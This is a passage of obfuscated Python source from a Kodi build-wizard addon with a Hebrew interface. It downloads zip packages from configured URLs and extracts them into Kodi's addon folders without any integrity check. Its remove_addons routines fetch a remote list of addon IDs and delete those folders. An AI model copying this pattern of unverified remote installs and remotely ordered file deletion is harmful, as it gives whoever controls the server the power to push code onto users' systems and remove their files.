						elif OOO000OO00OO0O00O >OOOO00O0OOOOOO00O :#line:5157
							wiz .log ("[Notifications] id: %s"%str (OOO000OO00OO0O00O ),xbmc .LOGNOTICE )#line:5158
							wiz .setS ('noteid',str (OOO000OO00OO0O00O ))#line:5159
							wiz .setS ("notedismiss","true")#line:5160
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5163
					except Exception as O000O000OOOO00O0O :#line:5164
						wiz .log ("Error on Notifications Window: %s"%str (O000O000OOOO00O0O ),xbmc .LOGERROR )#line:5165
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5167
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOO0O0OO0OO0O00OO ),xbmc .LOGNOTICE )#line:5168
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5169
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5170
def checkidupdate ():#line:5176
				wiz .setS ("notedismiss","true")#line:5178
				O0O000OOOO000O00O =wiz .workingURL (NOTIFICATION )#line:5179
				O0OO00O0000OO0OOO =" Kodi Premium"#line:5181
				O0OO0O000OOOO0O0O =wiz .checkBuild (O0OO00O0000OO0OOO ,'gui')#line:5182
				O0O00O0O00O0O0OOO =O0OO00O0000OO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5183
				if not wiz .workingURL (O0OO0O000OOOO0O0O )==True :return #line:5184
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5185
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OO00O0000OO0OOO ),'','אנא המתן')#line:5186
				O0OOOOO0OO000O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O00O0O00O0O0OOO )#line:5187
				try :os .remove (O0OOOOO0OO000O0OO )#line:5188
				except :pass #line:5189
				logging .warning (O0OO0O000OOOO0O0O )#line:5190
				if 'google'in O0OO0O000OOOO0O0O :#line:5191
				   O00OOO00OO000OO00 =googledrive_download (O0OO0O000OOOO0O0O ,O0OOOOO0OO000O0OO ,DP ,wiz .checkBuild (O0OO00O0000OO0OOO ,'filesize'))#line:5192
				else :#line:5195
				  downloader .download (O0OO0O000OOOO0O0O ,O0OOOOO0OO000O0OO ,DP )#line:5196
				xbmc .sleep (100 )#line:5197
				OOOOOOO0OO0OOO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0000OO0OOO )#line:5198
				DP .update (0 ,OOOOOOO0OO0OOO0O0 ,'','אנא המתן')#line:5199
				extract .all (O0OOOOO0OO000O0OO ,HOME ,DP ,title =OOOOOOO0OO0OOO0O0 )#line:5200
				DP .close ()#line:5201
				wiz .defaultSkin ()#line:5202
				wiz .lookandFeelData ('save')#line:5203
				if KODIV >=18 :#line:5204
					skindialogsettind18 ()#line:5205
				if INSTALLMETHOD ==1 :O0O000O0OO0O0O00O =1 #line:5208
				elif INSTALLMETHOD ==2 :O0O000O0OO0O0O00O =0 #line:5209
				else :DP .close ()#line:5210
def gaiaserenaddon ():#line:5212
  O00O0OO0000000000 =(ADDON .getSetting ("gaiaseren"))#line:5213
  OOOO0O0000O00OO00 =(ADDON .getSetting ("auto_rd"))#line:5214
  if O00O0OO0000000000 =='true'and OOOO0O0000O00OO00 =='true':#line:5215
    OOOOOOO0O0000O0OO =(NEWFASTUPDATE )#line:5216
    O0OOOO0O0OO0OO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5217
    O0OO0OO0OO0OO0OOO =xbmcgui .DialogProgress ()#line:5218
    O0OO0OO0OO0OO0OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5219
    O00O0O0O0O00O000O =os .path .join (PACKAGES ,'isr.zip')#line:5220
    OO000O00O00OO0O0O =urllib2 .Request (OOOOOOO0O0000O0OO )#line:5221
    OOOO00OO00O00OOOO =urllib2 .urlopen (OO000O00O00OO0O0O )#line:5222
    OO0OO000O00000O00 =xbmcgui .DialogProgress ()#line:5224
    OO0OO000O00000O00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5225
    OO0OO000O00000O00 .update (0 )#line:5226
    O00O00OOO0OOOO0OO =open (O00O0O0O0O00O000O ,'wb')#line:5228
    try :#line:5230
      O0OO0O0OOO0OOO0OO =OOOO00OO00O00OOOO .info ().getheader ('Content-Length').strip ()#line:5231
      OOOOOO0O0OOOOOO0O =True #line:5232
    except AttributeError :#line:5233
          OOOOOO0O0OOOOOO0O =False #line:5234
    if OOOOOO0O0OOOOOO0O :#line:5236
          O0OO0O0OOO0OOO0OO =int (O0OO0O0OOO0OOO0OO )#line:5237
    O00000O0000OOO0O0 =0 #line:5239
    O00O0O0OOOO000O0O =time .time ()#line:5240
    while True :#line:5241
          O0OOOO0OO000OO00O =OOOO00OO00O00OOOO .read (8192 )#line:5242
          if not O0OOOO0OO000OO00O :#line:5243
              sys .stdout .write ('\n')#line:5244
              break #line:5245
          O00000O0000OOO0O0 +=len (O0OOOO0OO000OO00O )#line:5247
          O00O00OOO0OOOO0OO .write (O0OOOO0OO000OO00O )#line:5248
          if not OOOOOO0O0OOOOOO0O :#line:5250
              O0OO0O0OOO0OOO0OO =O00000O0000OOO0O0 #line:5251
          if OO0OO000O00000O00 .iscanceled ():#line:5252
             OO0OO000O00000O00 .close ()#line:5253
             try :#line:5254
              os .remove (O00O0O0O0O00O000O )#line:5255
             except :#line:5256
              pass #line:5257
             break #line:5258
          O000O0OOOOOO0OOO0 =float (O00000O0000OOO0O0 )/O0OO0O0OOO0OOO0OO #line:5259
          O000O0OOOOOO0OOO0 =round (O000O0OOOOOO0OOO0 *100 ,2 )#line:5260
          O0OOOOOO0000OO0O0 =O00000O0000OOO0O0 /(1024 *1024 )#line:5261
          OOOOOOO000OOO00OO =O0OO0O0OOO0OOO0OO /(1024 *1024 )#line:5262
          OOOO0OOOOOO0O00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOOOO0000OO0O0 ,'teal',OOOOOOO000OOO00OO )#line:5263
          if (time .time ()-O00O0O0OOOO000O0O )>0 :#line:5264
            O0O0O0O0OOO0OO00O =O00000O0000OOO0O0 /(time .time ()-O00O0O0OOOO000O0O )#line:5265
            O0O0O0O0OOO0OO00O =O0O0O0O0OOO0OO00O /1024 #line:5266
          else :#line:5267
           O0O0O0O0OOO0OO00O =0 #line:5268
          O00OO0O00OOOO0OO0 ='KB'#line:5269
          if O0O0O0O0OOO0OO00O >=1024 :#line:5270
             O0O0O0O0OOO0OO00O =O0O0O0O0OOO0OO00O /1024 #line:5271
             O00OO0O00OOOO0OO0 ='MB'#line:5272
          if O0O0O0O0OOO0OO00O >0 and not O000O0OOOOOO0OOO0 ==100 :#line:5273
              OOOOOO0O0OO0O0000 =(O0OO0O0OOO0OOO0OO -O00000O0000OOO0O0 )/O0O0O0O0OOO0OO00O #line:5274
          else :#line:5275
              OOOOOO0O0OO0O0000 =0 #line:5276
          O00000OO0O0OO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O0O0OOO0OO00O ,O00OO0O00OOOO0OO0 )#line:5277
          OO0OO000O00000O00 .update (int (O000O0OOOOOO0OOO0 ),OOOO0OOOOOO0O00O0 ,O00000OO0O0OO0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5279
    O00O0000O00OO0O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5282
    O00O00OOO0OOOO0OO .close ()#line:5285
    extract .all (O00O0O0O0O00O000O ,O00O0000O00OO0O0O ,OO0OO000O00000O00 )#line:5286
    try :#line:5290
      os .remove (O00O0O0O0O00O000O )#line:5291
    except :#line:5292
      pass #line:5293
def iptvsimpldownpc ():#line:5294
    O00OOO0O0000OO0O0 =(IPTVSIMPL18PC )#line:5296
    O0O00OO000O00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5297
    OO00000000O0O00O0 =xbmcgui .DialogProgress ()#line:5298
    OO00000000O0O00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5299
    OOOO000OOOO0OOOOO =os .path .join (PACKAGES ,'isr.zip')#line:5300
    O0O0OOOO0000O000O =urllib2 .Request (O00OOO0O0000OO0O0 )#line:5301
    OO0000OOOOO0OO0OO =urllib2 .urlopen (O0O0OOOO0000O000O )#line:5302
    OOOOOOO00O00O0O0O =xbmcgui .DialogProgress ()#line:5304
    OOOOOOO00O00O0O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5305
    OOOOOOO00O00O0O0O .update (0 )#line:5306
    O0OO00O000000OO00 =open (OOOO000OOOO0OOOOO ,'wb')#line:5308
    try :#line:5310
      OOOO0O0O0OO00OOO0 =OO0000OOOOO0OO0OO .info ().getheader ('Content-Length').strip ()#line:5311
      OOO0000O00OOOO000 =True #line:5312
    except AttributeError :#line:5313
          OOO0000O00OOOO000 =False #line:5314
    if OOO0000O00OOOO000 :#line:5316
          OOOO0O0O0OO00OOO0 =int (OOOO0O0O0OO00OOO0 )#line:5317
    O0O00000O000OO000 =0 #line:5319
    OO00000O000O0O0O0 =time .time ()#line:5320
    while True :#line:5321
          O00O00O0O0O00O000 =OO0000OOOOO0OO0OO .read (8192 )#line:5322
          if not O00O00O0O0O00O000 :#line:5323
              sys .stdout .write ('\n')#line:5324
              break #line:5325
          O0O00000O000OO000 +=len (O00O00O0O0O00O000 )#line:5327
          O0OO00O000000OO00 .write (O00O00O0O0O00O000 )#line:5328
          if not OOO0000O00OOOO000 :#line:5330
              OOOO0O0O0OO00OOO0 =O0O00000O000OO000 #line:5331
          if OOOOOOO00O00O0O0O .iscanceled ():#line:5332
             OOOOOOO00O00O0O0O .close ()#line:5333
             try :#line:5334
              os .remove (OOOO000OOOO0OOOOO )#line:5335
             except :#line:5336
              pass #line:5337
             break #line:5338
          O0000O0000OO00OOO =float (O0O00000O000OO000 )/OOOO0O0O0OO00OOO0 #line:5339
          O0000O0000OO00OOO =round (O0000O0000OO00OOO *100 ,2 )#line:5340
          O00O0OOO0O00O00O0 =O0O00000O000OO000 /(1024 *1024 )#line:5341
          O00O0OO0O00O00OOO =OOOO0O0O0OO00OOO0 /(1024 *1024 )#line:5342
          OO00O0000O0O0OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0OOO0O00O00O0 ,'teal',O00O0OO0O00O00OOO )#line:5343
          if (time .time ()-OO00000O000O0O0O0 )>0 :#line:5344
            OO0000OO0O00000OO =O0O00000O000OO000 /(time .time ()-OO00000O000O0O0O0 )#line:5345
            OO0000OO0O00000OO =OO0000OO0O00000OO /1024 #line:5346
          else :#line:5347
           OO0000OO0O00000OO =0 #line:5348
          O0000O0OOO0O0O0O0 ='KB'#line:5349
          if OO0000OO0O00000OO >=1024 :#line:5350
             OO0000OO0O00000OO =OO0000OO0O00000OO /1024 #line:5351
             O0000O0OOO0O0O0O0 ='MB'#line:5352
          if OO0000OO0O00000OO >0 and not O0000O0000OO00OOO ==100 :#line:5353
              OOO0O0000OOOO00O0 =(OOOO0O0O0OO00OOO0 -O0O00000O000OO000 )/OO0000OO0O00000OO #line:5354
          else :#line:5355
              OOO0O0000OOOO00O0 =0 #line:5356
          O0000O0OO00O0OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0000OO0O00000OO ,O0000O0OOO0O0O0O0 )#line:5357
          OOOOOOO00O00O0O0O .update (int (O0000O0000OO00OOO ),OO00O0000O0O0OO00 ,O0000O0OO00O0OO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5359
    OO0O0O0O00O0O0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5362
    O0OO00O000000OO00 .close ()#line:5365
    extract .all (OOOO000OOOO0OOOOO ,OO0O0O0O00O0O0000 ,OOOOOOO00O00O0O0O )#line:5366
    try :#line:5370
      os .remove (OOOO000OOOO0OOOOO )#line:5371
    except :#line:5372
      pass #line:5373
def iptvsimpldown ():#line:5374
    O000000OOOO0O0OO0 =(IPTV18 )#line:5376
    O00O0O00O00O0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5377
    OOOOO00OOOO0000OO =xbmcgui .DialogProgress ()#line:5378
    OOOOO00OOOO0000OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5379
    OO0OOOO00O00OO0OO =os .path .join (PACKAGES ,'isr.zip')#line:5380
    O00OOOO0O0OO00O00 =urllib2 .Request (O000000OOOO0O0OO0 )#line:5381
    OOOO0OO000O0O0OOO =urllib2 .urlopen (O00OOOO0O0OO00O00 )#line:5382
    O00O0O000OO0O00O0 =xbmcgui .DialogProgress ()#line:5384
    O00O0O000OO0O00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5385
    O00O0O000OO0O00O0 .update (0 )#line:5386
    O0OO000000O00O000 =open (OO0OOOO00O00OO0OO ,'wb')#line:5388
    try :#line:5390
      O000O0O00OO0O0OOO =OOOO0OO000O0O0OOO .info ().getheader ('Content-Length').strip ()#line:5391
      OOO0OO0OO000OOO0O =True #line:5392
    except AttributeError :#line:5393
          OOO0OO0OO000OOO0O =False #line:5394
    if OOO0OO0OO000OOO0O :#line:5396
          O000O0O00OO0O0OOO =int (O000O0O00OO0O0OOO )#line:5397
    OOO00O00OO00OOOO0 =0 #line:5399
    O0000O0OOO0O0OOOO =time .time ()#line:5400
    while True :#line:5401
          OO0000000OOO0O00O =OOOO0OO000O0O0OOO .read (8192 )#line:5402
          if not OO0000000OOO0O00O :#line:5403
              sys .stdout .write ('\n')#line:5404
              break #line:5405
          OOO00O00OO00OOOO0 +=len (OO0000000OOO0O00O )#line:5407
          O0OO000000O00O000 .write (OO0000000OOO0O00O )#line:5408
          if not OOO0OO0OO000OOO0O :#line:5410
              O000O0O00OO0O0OOO =OOO00O00OO00OOOO0 #line:5411
          if O00O0O000OO0O00O0 .iscanceled ():#line:5412
             O00O0O000OO0O00O0 .close ()#line:5413
             try :#line:5414
              os .remove (OO0OOOO00O00OO0OO )#line:5415
             except :#line:5416
              pass #line:5417
             break #line:5418
          OOOOOOO00OO0000OO =float (OOO00O00OO00OOOO0 )/O000O0O00OO0O0OOO #line:5419
          OOOOOOO00OO0000OO =round (OOOOOOO00OO0000OO *100 ,2 )#line:5420
          OO0O0O00OO0OO00O0 =OOO00O00OO00OOOO0 /(1024 *1024 )#line:5421
          OO0OO0O0OO0OO0000 =O000O0O00OO0O0OOO /(1024 *1024 )#line:5422
          O00O000O0000O0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0O00OO0OO00O0 ,'teal',OO0OO0O0OO0OO0000 )#line:5423
          if (time .time ()-O0000O0OOO0O0OOOO )>0 :#line:5424
            OO0O0OO0O00O0OO00 =OOO00O00OO00OOOO0 /(time .time ()-O0000O0OOO0O0OOOO )#line:5425
            OO0O0OO0O00O0OO00 =OO0O0OO0O00O0OO00 /1024 #line:5426
          else :#line:5427
           OO0O0OO0O00O0OO00 =0 #line:5428
          O0OO0OOO00O0000O0 ='KB'#line:5429
          if OO0O0OO0O00O0OO00 >=1024 :#line:5430
             OO0O0OO0O00O0OO00 =OO0O0OO0O00O0OO00 /1024 #line:5431
             O0OO0OOO00O0000O0 ='MB'#line:5432
          if OO0O0OO0O00O0OO00 >0 and not OOOOOOO00OO0000OO ==100 :#line:5433
              OO0O0000O000OO000 =(O000O0O00OO0O0OOO -OOO00O00OO00OOOO0 )/OO0O0OO0O00O0OO00 #line:5434
          else :#line:5435
              OO0O0000O000OO000 =0 #line:5436
          OOO0O0O000O0O00O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0OO0O00O0OO00 ,O0OO0OOO00O0000O0 )#line:5437
          O00O0O000OO0O00O0 .update (int (OOOOOOO00OO0000OO ),O00O000O0000O0000 ,OOO0O0O000O0O00O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5439
    OO0O0000O0000OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5442
    O0OO000000O00O000 .close ()#line:5445
    extract .all (OO0OOOO00O00OO0OO ,OO0O0000O0000OOOO ,O00O0O000OO0O00O0 )#line:5446
    try :#line:5450
      os .remove (OO0OOOO00O00OO0OO )#line:5451
    except :#line:5452
      pass #line:5453
def testnotify ():#line:5454
	O00OO0OO00OOO00OO =wiz .workingURL (NOTIFICATION )#line:5455
	if O00OO0OO00OOO00OO ==True :#line:5456
		try :#line:5457
			OOO0OOO0000000O0O ,O00O0O0000000OOOO =wiz .splitNotify (NOTIFICATION )#line:5458
			if OOO0OOO0000000O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5459
			if STARTP2 ()=='ok':#line:5460
				notify .notification (O00O0O0000000OOOO ,True )#line:5461
		except Exception as OO0O0000OOO0O0O0O :#line:5462
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0000OOO0O0O0O ),xbmc .LOGERROR )#line:5463
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5464
def testnotify2 ():#line:5465
	OOO0OOO000O00OO0O =wiz .workingURL (NOTIFICATION2 )#line:5466
	if OOO0OOO000O00OO0O ==True :#line:5467
		try :#line:5468
			O00O0OOO00O000OOO ,O0OO0O00OOO000O0O =wiz .splitNotify (NOTIFICATION2 )#line:5469
			if O00O0OOO00O000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5470
			if STARTP2 ()=='ok':#line:5471
				notify .notification2 (O0OO0O00OOO000O0O ,True )#line:5472
		except Exception as OOOOOO00O00O0OO0O :#line:5473
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOO00O00O0OO0O ),xbmc .LOGERROR )#line:5474
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5475
def testnotify3 ():#line:5476
	O00O0O0OOO000OOO0 =wiz .workingURL (NOTIFICATION3 )#line:5477
	if O00O0O0OOO000OOO0 ==True :#line:5478
		try :#line:5479
			O0OO0O000000O000O ,OO00O0O00O0OOO000 =wiz .splitNotify (NOTIFICATION3 )#line:5480
			if O0OO0O000000O000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5481
			if STARTP2 ()=='ok':#line:5482
				notify .notification3 (OO00O0O00O0OOO000 ,True )#line:5483
		except Exception as OO00OOO0O000O0OOO :#line:5484
			wiz .log ("Error on Notifications Window: %s"%str (OO00OOO0O000O0OOO ),xbmc .LOGERROR )#line:5485
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5486
def infobuild ():#line:5487
	OOO0O0O0OOO0OO0OO =wiz .workingURL (NOTIFICATION )#line:5488
	if OOO0O0O0OOO0OO0OO ==True :#line:5489
		try :#line:5490
			OO00O0O000OOO0OO0 ,OOOO00O0O0OO0O00O =wiz .splitNotify (NOTIFICATION )#line:5491
			if OO00O0O000OOO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5492
			if STARTP2 ()=='ok':#line:5493
				notify .updateinfo (OOOO00O0O0OO0O00O ,True )#line:5494
		except Exception as OO00O00O0OOO00OOO :#line:5495
			wiz .log ("Error on Notifications Window: %s"%str (OO00O00O0OOO00OOO ),xbmc .LOGERROR )#line:5496
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5497
def servicemanual ():#line:5498
	OO00O000O00O0O000 =wiz .workingURL (HELPINFO )#line:5499
	if OO00O000O00O0O000 ==True :#line:5500
		try :#line:5501
			O00O0OOOOOOOO0O0O ,O000OO0O00O00OO0O =wiz .splitNotify (HELPINFO )#line:5502
			if O00O0OOOOOOOO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5503
			notify .helpinfo (O000OO0O00O00OO0O ,True )#line:5504
		except Exception as OOOOOO0000OOO0OOO :#line:5505
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOO0000OOO0OOO ),xbmc .LOGERROR )#line:5506
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5507
def testupdate ():#line:5509
	if BUILDNAME =="":#line:5510
		notify .updateWindow ()#line:5511
	else :#line:5512
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5513
def testfirst ():#line:5515
	notify .firstRun ()#line:5516
def testfirstRun ():#line:5518
	notify .firstRunSettings ()#line:5519
def fastinstall ():#line:5522
	notify .firstRuninstall ()#line:5523
def addDir (OOO0OOOO0OOO0OO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5530
	OO0000O0OOOOOOO00 =sys .argv [0 ]#line:5531
	if not mode ==None :OO0000O0OOOOOOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5532
	if not name ==None :OO0000O0OOOOOOO00 +="&name="+urllib .quote_plus (name )#line:5533
	if not url ==None :OO0000O0OOOOOOO00 +="&url="+urllib .quote_plus (url )#line:5534
	O0O0000OOOO00O0OO =True #line:5535
	if themeit :OOO0OOOO0OOO0OO0O =themeit %OOO0OOOO0OOO0OO0O #line:5536
	OO0O0O0O000OO00O0 =xbmcgui .ListItem (OOO0OOOO0OOO0OO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5537
	OO0O0O0O000OO00O0 .setInfo (type ="Video",infoLabels ={"Title":OOO0OOOO0OOO0OO0O ,"Plot":description })#line:5538
	OO0O0O0O000OO00O0 .setProperty ("Fanart_Image",fanart )#line:5539
	if not menu ==None :OO0O0O0O000OO00O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5540
	O0O0000OOOO00O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0000O0OOOOOOO00 ,listitem =OO0O0O0O000OO00O0 ,isFolder =True )#line:5541
	return O0O0000OOOO00O0OO #line:5542
def addFile (O0O0000OO00OO0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5544
	O0OO0O0OO00O0O0O0 =sys .argv [0 ]#line:5545
	if not mode ==None :O0OO0O0OO00O0O0O0 +="?mode=%s"%urllib .quote_plus (mode )#line:5546
	if not name ==None :O0OO0O0OO00O0O0O0 +="&name="+urllib .quote_plus (name )#line:5547
	if not url ==None :O0OO0O0OO00O0O0O0 +="&url="+urllib .quote_plus (url )#line:5548
	OO0O0O0O0O0OO000O =True #line:5549
	if themeit :O0O0000OO00OO0OOO =themeit %O0O0000OO00OO0OOO #line:5550
	O0OO0OOO0O000OOOO =xbmcgui .ListItem (O0O0000OO00OO0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5551
	O0OO0OOO0O000OOOO .setInfo (type ="Video",infoLabels ={"Title":O0O0000OO00OO0OOO ,"Plot":description })#line:5552
	O0OO0OOO0O000OOOO .setProperty ("Fanart_Image",fanart )#line:5553
	if not menu ==None :O0OO0OOO0O000OOOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5554
	OO0O0O0O0O0OO000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0O0OO00O0O0O0 ,listitem =O0OO0OOO0O000OOOO ,isFolder =False )#line:5555
	return OO0O0O0O0O0OO000O #line:5556
def get_params ():#line:5558
	OOO00O0OOOO00OO00 =[]#line:5559
	OOO0O0O000OOO0O0O =sys .argv [2 ]#line:5560
	if len (OOO0O0O000OOO0O0O )>=2 :#line:5561
		OO0OO0OO00O000OOO =sys .argv [2 ]#line:5562
		OOO000O0OOOO0OOOO =OO0OO0OO00O000OOO .replace ('?','')#line:5563
		if (OO0OO0OO00O000OOO [len (OO0OO0OO00O000OOO )-1 ]=='/'):#line:5564
			OO0OO0OO00O000OOO =OO0OO0OO00O000OOO [0 :len (OO0OO0OO00O000OOO )-2 ]#line:5565
		OOOOOO000OOO000O0 =OOO000O0OOOO0OOOO .split ('&')#line:5566
		OOO00O0OOOO00OO00 ={}#line:5567
		for OO00OOO0O0O000O00 in range (len (OOOOOO000OOO000O0 )):#line:5568
			OO0000OO0O0O0OO0O ={}#line:5569
			OO0000OO0O0O0OO0O =OOOOOO000OOO000O0 [OO00OOO0O0O000O00 ].split ('=')#line:5570
			if (len (OO0000OO0O0O0OO0O ))==2 :#line:5571
				OOO00O0OOOO00OO00 [OO0000OO0O0O0OO0O [0 ]]=OO0000OO0O0O0OO0O [1 ]#line:5572
		return OOO00O0OOOO00OO00 #line:5574
def remove_addons ():#line:5576
	try :#line:5577
			import json #line:5578
			OOOO00OOOOOO00OO0 =urllib2 .urlopen (remove_url ).readlines ()#line:5579
			for O00OO0OO0OO0O00OO in OOOO00OOOOOO00OO0 :#line:5580
				O0O0O0OO00O0OOOO0 =O00OO0OO0OO0O00OO .split (':')[1 ].strip ()#line:5582
				O0000O000OOO00OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0O0O0OO00O0OOOO0 ,'false')#line:5583
				OOOO0O0OOOO000000 =xbmc .executeJSONRPC (O0000O000OOO00OO0 )#line:5584
				O0OO000000O0OO00O =json .loads (OOOO0O0OOOO000000 )#line:5585
				OO0O00OO000O000O0 =os .path .join (addons_folder ,O0O0O0OO00O0OOOO0 )#line:5587
				if os .path .exists (OO0O00OO000O000O0 ):#line:5589
					for OOO000000OOOOO00O ,O0O00OOO000OO0OO0 ,OOOOOO0OOO0O00O00 in os .walk (OO0O00OO000O000O0 ):#line:5590
						for O00OOOOO0000O000O in OOOOOO0OOO0O00O00 :#line:5591
							os .unlink (os .path .join (OOO000000OOOOO00O ,O00OOOOO0000O000O ))#line:5592
						for OOOO0OOO0OOO0OOO0 in O0O00OOO000OO0OO0 :#line:5593
							shutil .rmtree (os .path .join (OOO000000OOOOO00O ,OOOO0OOO0OOO0OOO0 ))#line:5594
					os .rmdir (OO0O00OO000O000O0 )#line:5595
			xbmc .executebuiltin ('Container.Refresh')#line:5597
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5598
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5599
	except :pass #line:5600
def remove_addons2 ():#line:5601
	try :#line:5602
			import json #line:5603
			OOO0OOO00OOOO000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5604
			for O00OO0O0000O0OOOO in OOO0OOO00OOOO000O :#line:5605
				OOO0000O0O0OO00O0 =O00OO0O0000O0OOOO .split (':')[1 ].strip ()#line:5607
				O0O00OOOO00000O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOO0000O0O0OO00O0 ,'false')#line:5608
				O00OOO000OO0000OO =xbmc .executeJSONRPC (O0O00OOOO00000O00 )#line:5609
				OOOO0O00O0OOO00O0 =json .loads (O00OOO000OO0000OO )#line:5610
				O000O0O0O00O0O0OO =os .path .join (user_folder ,OOO0000O0O0OO00O0 )#line:5612
				if os .path .exists (O000O0O0O00O0O0OO ):#line:5614
					for O0OOOOOO0OO0O0O00 ,O00000O00OO0OO0O0 ,OOOOO00O0000O0000 in os .walk (O000O0O0O00O0O0OO ):#line:5615
						for O0O00O0O00OO00O0O in OOOOO00O0000O0000 :#line:5616
